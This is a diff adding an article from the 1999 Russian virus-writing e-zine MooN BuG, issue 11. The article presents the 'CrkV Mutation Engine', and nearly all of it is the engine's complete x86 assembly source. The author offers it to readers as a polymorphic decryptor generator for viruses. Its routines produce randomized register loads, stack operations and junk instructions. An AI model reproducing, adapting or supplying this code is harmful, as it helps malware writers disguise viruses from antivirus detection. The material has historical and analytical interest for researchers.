@@ -1,0 +1,355 @@
+╔════════╤════════════════════════════════════════════════════╤══════════╤═══╗
+║Okt 1999│NF представляет электронный журнал MooN BuG issue 11│   CrkV   │00E║
+╟────────┴────────────────────────────────────────────────────┴──────────┴───╢
+║                            CrkV Mutation Engine                            ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+     В данном номере я решил представить читателям свой простенький енджин для
+вирусов  с  полиморфным  расшифровщиком.  Данный  движок  представляет из себя
+несколько   подпрограмм,   которые   генерируют   заданные  команды  в  буфер,
+определяемый  регистрами  Es:Di.  (Кстати,  эти  же команды используются и для
+"мусора"). Единственное, что я хотел бы выделить, это использование команд 386
+проца  работы  с  битами  - BT и BTS, что значительно упрощает выбор свободных
+регистров. (См. подпрограммы GetFr[ee]R[egistr] GetFr[ee]R[egistr&]S[et]).
+
+=== Cut ===                                                           cvme.asm
+;CrkV Mutation Engine
+.386
+Public  LoadReg
+Public  LoadR2
+Public  Reg_Musor
+Public  Com_Musor
+Public  GetFrR
+Public  GetFrRS
+Public  Random
+Public  Rand04
+Public  Rand08
+Public  Rand16
+;===================================================================
+;       0123456789 123456789 123456789 123456789 123456789 123456789
+;===================================================================
+
+CSeg    Segment Para USE16 'code'
+        Assume  Cs:CSeg,Ds:CSeg,Ss:CSeg,Es:CSeg
+CVME:
+;-------------------------------------------------------
+LoadR2  Proc
+        Push    Ax
+        In      Ax,40h
+        Test    Al,10b
+        Pop     Ax
+        Jz      LoadReg
+
+;команды Mov Rg16,Im16 (Random1)
+;        несколько мусора
+;        Add (Sub, Xor)
+
+        Push    Bx Ax Cx
+        Xchg    Ax,Cx
+        In      Ax,40h
+        Push    Ax
+        Xchg    Cx,Ax
+        Call    LoadReg
+        Mov     Al,81h
+        Stosb
+        Pop     Cx Bx                   ;Cx:=Rand1
+        Call    Rand08
+        Cmp     Al,01h
+        Pop     Ax
+        Jg      @Xor
+        Je      @Sub
+        Or      Al,11000000b            ;11000xxxb (Add R16,Im16)
+@CM00:  Sub     Bx,Cx
+        Jmp     @CR2
+@Sub:   Or      Al,11101000b            ;11101xxxb (Sub R16,Im16)
+        Xchg    Bx,Cx
+        Jmp     @CM00
+@Xor:   Or      Al,11110000b            ;11110xxxb (Xor R16,Im16)
+        Xor     Bx,Cx
+@CR2:   StoSB
+        Xchg    Ax,Bx
+        StoSW
+        Pop     Bx
+        Ret
+LoadR2  Endp
+;-------------------------------------------------------
+LoadReg Proc
+;генерирует команду(ы) загрузки регистра
+;Ax - используемый регистр
+;Cx - значение
+;Es:Di - буфер
+
+;на выходе: Es:Di - буфер для новой команды
+
+        Push    Ax
+        In      Ax,40h
+        Test    Al,100b
+        Pop     Ax
+        Je      LM1
+
+;---------------------------
+LM0     Proc
+
+;команда Mov Rg16,Im
+
+        Push    Ax
+        Or      Al,10111000b            ;Mov Rg16,Im
+        StoSB
+        XChg    Cx,Ax
+        StoSW
+        Pop     Ax
+        Ret
+LM0     Endp
+;---------------------------
+LM1     Proc
+
+;команды Push Im16
+;        несколько мусора
+;        Pop R16
+
+        Or      Al,01011000b            ;Pop R16
+        Push    Ax
+        Mov     Al,68h                  ;Push Im16
+        StoSB
+        XChg    Cx,Ax
+        StoSW
+        Test    Dh,00000100b            ;мусор нужен ???
+        Jz      @NoRbL1
+        Call    GetMDx
+@NoRbL1:Pop     Ax
+        StoSB
+        Ret
+LM1     Endp
+;---------------------------
+
+LoadReg Endp
+;-------------------------------------------------------
+GetFrR  Proc
+
+;(Вых) Al - свободный регистр
+
+@NextR: Call    Rand08
+        Bt      Dx,Ax
+        Jc      @NextR                  ;Регистр уже используется
+        Ret
+GetFrR  Endp
+;-------------------------------------------------------
+GetFrRS Proc
+
+;(Вых) Al - свободный регистр (объявляется занятым)
+
+@NextRS:Call    Rand08
+        Bts     Dx,Ax
+        Jc      @NextRS                 ;Регистр уже используется
+        Ret
+GetFrRS Endp
+;-------------------------------------------------------
+GetMus  Proc
+
+;генерирует мусор
+
+        Push    Ax Bx Cx
+        Sub     Cx,Cx
+        Call    Rand16
+        Test    Al,1100b                ;Без команды (00xxb)
+        Jz      @G00
+        Call    RndSt2
+        Cmp     Al,0110b
+        Jg      @M01
+        Call    RndID
+@M01:   Call    RndCom
+@M02:   Call    RndStDx
+        Call    ClrStack
+
+@G00:   Pop     Cx Bx Ax
+        Ret
+GetMus  Endp
+;-------------------------------------------------------
+Com_Musor:
+        StoSB
+Reg_Musor:
+GetMDx  Proc
+        Test    Dh,00000001b            ;мусор нужен ???
+        Jz      @NoM01
+        Call    GetMus
+@NoM01: Ret
+GetMDx  Endp
+;-------------------------------------------------------
+Random  Proc
+        Push    Cx Dx
+        In      Ax,40h
+        Sub     Dx,Dx
+        Sub     Cx,Cx
+        Mov     Cl,Al
+        JCxZ    Random + 2
+        Div     Cx
+        In      Al,40h
+        Mov     Ah,Dh
+        Pop     Dx Cx
+        Ret
+Random  EndP
+;-------------------------------------------------------
+Rand04  Proc
+        In      Ax,40h
+        And     Ax,11b
+        Ret
+Rand04  EndP
+;-------------------------------------------------------
+Rand08  Proc
+        In      Ax,40h
+        And     Ax,111b
+        Ret
+Rand08  EndP
+;-------------------------------------------------------
+Rand16  Proc
+        Call    Random
+        And     Ax,1111b
+        Ret
+Rand16  EndP
+;-------------------------------------------------------
+Push16  Proc
+;генерирует команду помещения в стек
+        Push    Ax
+        Call    Random
+        And     Ax,111b
+        Cmp     Al,01h
+        Jge     @P_00
+        Mov     Al,68h                  ;Push Im16 (00h)
+        StoSB
+        In      Ax,40h
+        StoSW
+        Pop     Ax
+        Ret
+
+@P_00:  Jne     @P_01
+        Mov     Al,6Ah                  ;Push Im8 (01h)
+        StoSB
+        In      Al,40h
+
+@P_ExB: StoSB
+        Pop     Ax
+        Ret
+
+@P_01:  Cmp     Al,05h
+        Jne     @P_05
+        Mov     Al,9Ch                  ;PushF (05h)
+        Jmp     @P_ExB
+
+@P_05:  Jg      @P_08
+        Call    Rand04
+        Shl     Al,3
+        Or      Al,00000110b            ;000xx110 Push SR (03h,04h)
+        Jmp     @P_ExB
+
+@P_08:  Call    Rand08
+        Or      Al,01010000b            ;01010xxx Push R16 (06h-08h)
+        Jmp     @P_ExB
+
+Push16  EndP
+;-------------------------------------------------------
+RndStack        Proc
+;генерирует случайные команды работы со стеком
+        Push    Ax
+        In      Ax,40h
+        Test    Al,11b
+        Jnz     @ExP00
+        Call    Push16
+        Inc     Cx
+@ExP00: In      Ax,40h
+        Test    Al,11100b
+        Jnz     @ExP01
+        JCxZ    @ExP01                  ;В стеке ничего нет
+        Call    GetFrR
+        Or      Al,01011000b            ;01011xxx Pop R16
+        StoSB
+        Dec     Cx
+@ExP01: Pop     Ax
+        Ret
+RndStack        EndP
+;-------------------------------------------------------
+RndStDx Proc
+        Test    Dh,00000010b            ;мусор нужен ???
+        Jz      @NoMSt
+        Call    RndStack
+@NoMSt: Ret
+RndStDx EndP
+;-------------------------------------------------------
+RndSt2  Proc
+        Call    RndStDx
+        Jmp     RndStDx
+RndSt2  EndP
+;-------------------------------------------------------
+ClrStack        Proc
+        JCxZ    @ExCS                   ;В стеке ничего нет
+        Push    Ax
+@LpCS:  Call    GetFrR
+        Or      Al,01011000b            ;01011xxx Pop R16
+        StoSB
+        Loop    @LpCS
+        Pop     Ax
+@ExCs:  Ret
+ClrStack        EndP
+;-------------------------------------------------------
+RndID   Proc
+        Push    Ax
+
+        In      Ax,40h
+
+        Mov     Bl,01000000b            ;Inc (00h)
+        Test    Al,001b
+        Jne     @MID00
+        Mov     Bl,01001000b            ;Dec (01h)
+@MID00: Call    GetFrR
+        Or      Al,Bl
+
+        StoSB
+        Pop     Ax
+        Ret
+RndID   EndP
+;-------------------------------------------------------
+RndCom  Proc
+        Push    Ax Bx
+
+        Call    Random
+        Test    Al,111b
+        Jnz     @NMov
+        Call    GetFrR
+        Or      Al,0B8h                 ;10111xxx - Mov R16,Im
+        StoSB
+        Jmp     @ExRC16
+
+@NMov:  Call    Rand08
+        Shl     Al,3                    ;00xxx011b - команда
+        Or      Ax,00000011b            ;Устанавливаем биты направления и разр.
+        StoSB
+        In      Ax,40h
+        And     Al,11000111b            ;Reg1
+        Xchg    Ax,Bx
+        Call    GetFrR
+        Shl     Al,3
+        Or      Al,Bl
+        StoSB                           ;Byte R/M
+        Shr     Al,6
+        Cmp     Al,10b
+        Jg      @ExRC                   ;Com R16,R16
+        Je      @ExRC16                 ;Com R16,[RBI+Ofs16]
+
+        Cmp     Bl,00000110b            ;Com R16,[Mem]
+        Je      @ExRC16
+        Cmp     Al,00h                  ;Com R16,[RBI]
+        Je      @ExRC
+        In      Ax,40h
+        StoSB
+        Jmp     @ExRC
+
+@ExRC16:In      Ax,40h
+        StoSW
+@ExRC:  Pop     Bx Ax
+        Ret
+RndCom  EndP
+;-------------------------------------------------------
+CRight  db      'CrkV Mutation Engine [CVME] 1.01'
+;-------------------------------------------------------
+CSeg    EndS
+        End     CVME
+=== Cut ===
